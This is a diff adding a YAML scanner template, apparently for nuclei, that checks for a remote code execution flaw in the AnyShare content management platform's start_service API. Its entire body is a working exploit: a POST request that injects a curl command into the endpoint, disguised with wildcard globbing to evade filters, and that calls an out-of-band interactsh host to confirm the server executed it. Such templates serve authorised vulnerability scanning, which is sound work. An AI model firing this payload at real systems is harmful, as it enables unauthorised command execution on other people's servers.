@@ -1,0 +1,35 @@
+id: poc-yaml-anyshare-icmp-start-service-rce
+info:
+  name: 爱数 AnyShare智能内容管理平台 start_service 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: DNSLOG,rce
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - method: POST
+    path:
+      - /api/ServiceAgent/start_service
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      ["com;/u?r/b?n/c??l {{reverse}}"]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "null"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
